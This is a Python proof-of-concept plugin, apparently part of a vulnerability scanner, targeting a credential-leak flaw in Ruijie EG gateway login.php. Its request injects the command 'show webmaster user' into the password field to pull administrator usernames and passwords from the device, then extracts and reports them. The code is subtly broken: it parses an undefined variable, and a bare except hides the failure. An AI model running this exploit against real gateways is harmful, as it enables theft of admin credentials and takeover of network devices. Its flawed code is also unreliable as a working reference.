#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :   'https://peiqi.wgpsec.org/wiki/iot/锐捷/锐捷 EG易网关 login.php 管理员账号密码泄露漏洞.html',

      'huixian'   :   '',

      'method'    :   'post',

      'bugname'   :   '锐捷 EG易网关 管理员账号密码泄露漏洞',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
        'User-Agent': ua,
        "Content-Type": "application/x-www-form-urlencoded",
        }
  data = 'username=admin&password=admin?show+webmaster+user'
  target = "/login.php"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if res.status_code == 200 and "data" in res.text and "status" in res.text:
      user_data = re.findall(r'admin(.*?)",',resp.text)[0]
      ret['huixian'] = '账号密码为：{}'.format(user_data)
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret